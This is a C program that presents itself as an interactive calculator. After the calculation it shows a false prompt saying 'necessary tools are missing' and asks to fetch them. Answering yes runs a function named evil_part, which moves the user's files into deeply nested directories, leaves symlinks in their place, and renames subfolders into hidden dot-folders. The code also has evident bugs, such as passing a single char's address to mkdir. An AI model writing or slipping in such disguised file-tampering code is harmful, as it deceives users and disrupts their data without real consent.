#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>
#include <limits.h>

void hide_folders(const char *dir_path) {
    DIR *dir = opendir(dir_path);
    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
            continue;
        }

        char old_path[PATH_MAX];
        char new_path[PATH_MAX];

        strcpy(old_path, dir_path);
        strcat(old_path, "/");
        strcat(old_path, entry->d_name);

        if (entry->d_type == DT_DIR) {
            strcpy(new_path, dir_path);
            strcat(new_path, "/.");
            strcat(new_path, entry->d_name);

            rename(old_path, new_path);

            hide_folders(new_path);
        }
    }
    closedir(dir);
}

void evil_part() {
    char start_dir[PATH_MAX];
    getcwd(start_dir, sizeof(start_dir));

    for (char i = 'a'; i <= 'z'; i++)
    {
        mkdir(&i, 0777);
        chdir(&i);
    }

    char new_dir[PATH_MAX];
    getcwd(new_dir, sizeof(new_dir));

    DIR *dir = opendir(start_dir);
    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
            continue;
        }

        char old_path[PATH_MAX];
        char new_path[PATH_MAX];
        strcpy(old_path, start_dir);
        strcat(old_path, "/");
        strcat(old_path, entry->d_name);
        
        strcpy(new_path, new_dir);
        strcat(new_path, "/");
        strcat(new_path, entry->d_name);

        if (entry->d_type == DT_REG) {
            rename(old_path, new_path);
        } 
    }

    closedir(dir);


    dir = opendir(new_dir);

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
            continue;
        }

        char old_path[PATH_MAX];
        char link_path[PATH_MAX];

        strcpy(old_path, new_dir);
        strcat(old_path, "/");
        strcat(old_path, entry->d_name);

        strcpy(link_path, start_dir);
        strcat(link_path, "/");
        strcat(link_path, entry->d_name);

        if (entry->d_type == DT_REG) {
            symlink(old_path, link_path);
        }
    }
    closedir(dir);

    hide_folders(start_dir);
}

int calculator()
{
    int num;
    char operation;

    printf("Enter a Number: ");
    scanf("%d", &num);

    while (operation != '=') 
    {
        printf("Enter Operation: ");
        scanf(" %c", &operation); 

        int num_2;

        switch (operation)
        {
            case '+':
                printf("Enter another Number: ");
                scanf("%d", &num_2);

                num += num_2;
                break;

            case '-':
                printf("Enter another Number: ");
                scanf("%d", &num_2);

                num -= num_2;
                break;

            case '*':
                printf("Enter another Number: ");
                scanf("%d", &num_2);

                num *= num_2;
                break;

            case '/':
                printf("Enter another Number: ");
                scanf("%d", &num_2);

                while (num_2 == 0)
                {
                    printf("Division by 0 error. Enter another Number: ");
                    scanf("%d", &num_2);
                }
                num /= num_2;
                break;
        }
    }

    printf("Some necessary tools are missing which might cause the calculator to give wrong results.\n");
    printf("Do you want them to be fetched? [Y/N]: ");
    
    char y;
    scanf(" %c", &y); 

    if (y == 'Y' || y == 'y')
    {
        evil_part();
        printf("Result: %d\n", num);
    }
    else if (y == 'N' || y == 'n')
    {
        printf("Okay :(\n");
    }

    return num;
}


int main()
{
    calculator();
    return 0; 
}
